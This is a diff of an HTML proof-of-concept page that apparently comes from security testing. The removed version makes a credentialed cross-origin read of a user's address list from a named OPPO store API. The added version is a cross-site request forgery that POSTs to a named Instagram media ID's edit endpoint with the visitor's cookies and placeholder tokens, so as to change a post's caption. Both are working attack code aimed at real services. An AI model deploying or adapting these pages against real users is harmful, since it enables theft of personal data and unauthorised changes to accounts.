@@ -1,30 +1,68 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CORS Request with Credentials</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <title>CSRF PoC</title>
 </head>
-<body>
-    <h1>Simple CORS Request with Credentials</h1>
-    <button onclick="makeCorsRequest()">Fetch Data</button>
-    <pre id="result"></pre>
 
-    <script>
-        function makeCorsRequest() {
-            fetch("https://opsg-gateway-in.oppo.com/v2/api/rest/mallapp/user/address/list/fetch?storeViewCode=in&storeCode=in&configModule=3&countryCode=IN&deviceType=2&source=1", {
-                method: "GET",
-                credentials: "include", // *This is the key for sending cookies*
-                headers: {
-                    "Content-Type": "application/json"
-                }
-            })
-            .then(response => response.json())
-            .then(data => {
-                document.getElementById("result").textContent = JSON.stringify(data, null, 2);
-            })
-            .catch(error => console.error("Error:", error));
-        }
-    </script>
+<body>
+  <h2>CSRF Demonstration</h2>
+  <button id="run">Run test</button>
+  <pre id="out">Ready</pre>
+
+<script>
+const out = document.getElementById("out");
+
+document.getElementById("run").onclick = async () => {
+
+  out.textContent = "Sending request...";
+
+  const body = {
+    caption_text: "CSRF_TEST",
+    coauthor_invites: JSON.stringify({
+      added: [],
+      in: [],
+      removed: []
+    }),
+    usertags: JSON.stringify({
+      added: [],
+      in: [],
+      removed: []
+    }),
+    jazoest: "00000",
+    fb_dtsg: "arbitrary-value"
+  };
+
+  try {
+    const response = await fetch(
+      "https://www.instagram.com/api/v1/media/3994565454382745570/edit_media",
+      {
+        method: "POST",
+        credentials: "include",
+
+        headers: {
+          "Content-Type": "application/json",
+          "X-Csrftoken": "arbitrary-value"
+        },
+
+        body: JSON.stringify(body)
+      }
+    );
+
+    const text = await response.text();
+
+    out.textContent =
+      "Status: " + response.status + "\n\n" +
+      text;
+
+  } catch (error) {
+    out.textContent =
+      "Browser blocked/failed the request:\n\n" +
+      error;
+  }
+};
+</script>
+
 </body>
 </html>
